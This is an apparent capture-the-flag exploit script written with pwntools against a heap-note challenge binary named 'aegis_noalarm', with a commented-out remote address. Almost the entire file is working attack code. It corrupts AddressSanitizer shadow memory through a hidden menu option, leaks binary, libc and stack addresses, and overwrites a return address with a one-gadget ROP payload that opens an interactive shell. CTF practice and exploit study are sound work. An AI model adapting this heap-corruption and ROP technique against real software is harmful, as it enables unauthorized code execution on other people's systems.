#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./aegis_noalarm")

#p = remote("111.186.63.209", 6666)

p.recvuntil("Choice: ")
wait("go")

def add(size, content, ID):

    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)
    p.recvuntil("ID: ")
    p.sendline(str(ID))
    p.recvuntil("Choice: ")

def show(idx):

    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    data = p.recvuntil("Choice: ")
    return data 

def update(idx, content, ID, pwn=False):

    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("New Content: ")
    p.send(content)
    if pwn == True:
        return 
    p.recvuntil("New ID: ")
    p.sendline(str(ID))
    p.recvuntil("Choice: ")

def delete(idx):

    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Choice: ")

def secret(Number):

    p.sendline("666")
    p.recvuntil("Number: ")
    p.sendline(str(Number))
    p.recvuntil("Choice: ")


'''
#######
add(64, "a"*(64-8), 65535) #0
add(16, "a"*(64-8), 3735928559) #
add(64, "a"*(64-8), 65535)
add(16, "a"*(16-8), 3735928559)
#######
'''

'''
add(64, "a"*(64-8), 65535) #0
add(16, "a"*(16-8), 3735928559) #1
add(64, "a"*(64-8), 65535)#2
add(16, "a"*(16-8), 3735928559)#3
add(64, "a"*(64-8), 65535)#4
wait("1")
update(1, "a"*(16-4), 3735928559) #1!!!
update(1, "a"*(16), 0xffffff00000302ef) #1!!!
secret(0xc047fff8009-1)
update(1, "a"*19, 0xffffffffffffff00)
update(1, "a"*15+"\n", 0x02ffffff00000002)
#delete! 
update(1, "hello\n", 12345) #1
#update()
delete(1)
pause()
wait("1")
add(16, "a"*8,3735928559) #5
add(16, "a"*8,3735928559) #6
update(5, "a"*12, 3735928559)
update(5, "a"*16, 3735928559)
'''
#add(64, "a"*56, 65535)#0
#add(16, "a"*8, 0x1111111111111111)#1


#overwrite the second.
add(0x10, "a"*(0x10-8), 0x1111111111111111)#0
add(0x10, "a"*8, 0x0011111111111111)#1
add(0x10, "a"*(0x10-8), 0x111111111111111)#2
add(0x10, "a"*(0x10-8), 0x111111111111111)#3

update(1, "a"*15, 0x0011111111111111)
secret(0xc047fff800d-1)
update(1, "a"*16+"\x02\x00\x00\x00\xff\x01", 0x012fffff0002ffff)
update(1, p64(0x602000000130)+"\n", 0x0200000000000000)
delete(1)
add(0x10, p64(0x602000000138), 0x1111111111111100)#4
add(0x10, p64(0x602000000138), 0x1111111111111100)#5
#leak
data = show(1)#6
addr = data.split(" ")[1][:6]+"\x00"*2
binary = u64(addr)
got = binary + 0x233340 
binary_start = binary - 0x114ab0
print hex(binary)
#fix 70
update(4, "a"*3, 0x00111111111111)
update(4, p64(0x602000000130)+"a", binary)
update(1, "a"*3, 0x00111111111111)
update(1, p64(got)+"a", binary)
data2 = show(5)
libc_addr = data2.split(" ")[1][:6] + "\x00"*2
print hex(u64(libc_addr))
libc = u64(libc_addr) - 0xe4fa0
one = libc + 0x10a38c
gets = libc + 0x800b0
leak_stack = libc+0x3f04c0
update_func = binary_start + 0x1145f0

#again 
update(1, "a"*2+"\n", 0)
update(1, "a"*3, 0x00111111111111)
update(1, p64(leak_stack)+"a", binary)
data3 = show(5)
stack_addr = data3.split(" ")[1][:6]+"\x00"*2
stack = u64(stack_addr)
print hex(stack)
target = stack - 0x178 
update(1, "a"*2+'\n',0)
update(1, "a"*3, 0x00111111111111)
update(1, p64(target)+"a", binary)
print hex(one)
wait("what now")

rop=p64(one)+p64(0)*0x50

update(5, chr(0xff)*2+"\0"*6+p64(target)*3+p64(0x30)+rop+"\n", 0,True) #rip
 

p.interactive()
